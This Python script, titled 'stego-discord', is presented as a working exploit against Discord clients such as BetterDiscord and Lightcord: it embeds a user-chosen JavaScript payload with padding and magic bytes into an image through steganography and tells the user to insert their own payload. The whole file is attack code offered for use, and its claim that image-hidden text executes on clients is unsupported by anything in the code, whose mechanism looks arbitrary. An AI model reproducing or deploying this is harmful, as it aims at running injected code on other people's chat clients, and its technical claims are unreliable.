""" 
    Title: stego-discord
    Author: 0x44F
    Description: A Discord exploit taking advantage of steganography. Shown in checksum's proof-of-concept
                 but later, truly adapted by me. Still working to this day on clients such as BD and Lightcord.
"""

from steganography import Steganography as stego

PAYLOAD = "alert(0);"  # Insert your payload here, example 'alert(0);', optionally, use one of the payloads provided in /payloads/
CHARCODE = "\x00\x32\x38\xF1\xA3\xC7\xF4\x00\xFF\xFF\xFF"

MAX_LEN = 128

class Exploit:
    def __init__(self, target_image):
        self.target_image = target_image
        self.payload = PAYLOAD
        self.padding_length = int(len(CHARCODE) * 2.3)
        
    def create_padding(self) -> str:
        return str('\x00' * self.padding_length)
    
    def canary_client_fix(self):
        """ Some issues running exploit on canary / regular clients, this tries to fix it for slightly outdated versions """
        self.padding_length = int(len(self.payload) + len(CHARCODE) / 2) + 24
        self.payload = self.payload + "\xF4\xC1\x00" # More padding sometimes works
        
        # Note this is not called because it disables use on other clients (BD, LIGHTCORD)
        return
    
    def _check_canary(self):
        """ Check if payload is canary compatible """
        if "\n" in self.payload:
            return False
        if len(self.payload) < 6:
            return False
        
        return True
        
        

if __name__ == "__main__":
    if len(PAYLOAD) > MAX_LEN:
        quit("Payload too long!")

    target_image = input("Target Image Path > ")  # Grab target image
    
    # Get path to save image (e.g: C:\Documents\my_hacked_image.jpg)    
    output_path = input("Output Path > ")
    
    exploit = Exploit(target_image)
    stego.encode(target_image, output_path, exploit.create_padding() + PAYLOAD + str(CHARCODE))
    
    if not exploit._check_canary():
        print("[NOTE] Your payload will not run on normal / canary clients.")
        
    print(f"We found your payload, It was: {str(stego.decode(output_path))}")
    print("If the above text is [incorrect] please try again using path you have access to.")
    
